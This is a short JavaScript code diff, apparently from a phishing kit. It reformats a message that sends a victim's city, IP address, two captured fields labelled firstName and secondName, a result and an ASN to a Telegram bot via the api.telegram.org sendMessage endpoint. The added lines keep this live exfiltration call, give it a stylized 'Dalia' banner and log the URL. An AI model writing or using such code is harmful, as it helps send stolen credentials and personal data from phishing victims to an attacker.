@@ -104,8 +104,8 @@ var today = new Date();
    var hour = today.getHours();
    var minute = today.getMinutes();
 
-var url = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text= Someone from ' + city1 + "\n with IP - " + data1 +' \n •> '+firstName +"  \n 2 •> "+secondName + "  Time •>  " + day + "/" + month + "/" + year + "  " + hour + ":" + minute + " Result •> " +final+'ASN •> '+asn;
-
+var url = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text=  ✦҈͜͡➳✶𝕯𝖆𝖑𝖎𝖆%0A -----------𝑥--------------𝑥-----------𝑥----------- %0A✶ '+firstName +"%0A✶ "+secondName + " %0A✶ Time   ➳ " + day + "/" + month + "/" + year + "  " + hour + ":" + minute + "%0A✶ Result ➳ " +final+'%0A✶ ASN    ➳ '+asn+'%0A------------𝑥--------------𝑥-----------𝑥-----------';
+console.log(url);
 let api = new XMLHttpRequest();
 
  api.open("GET", url, true);
@@ -114,5 +114,6 @@ let api = new XMLHttpRequest();
 
   });
 
-}
-}
+   }
+  }
+
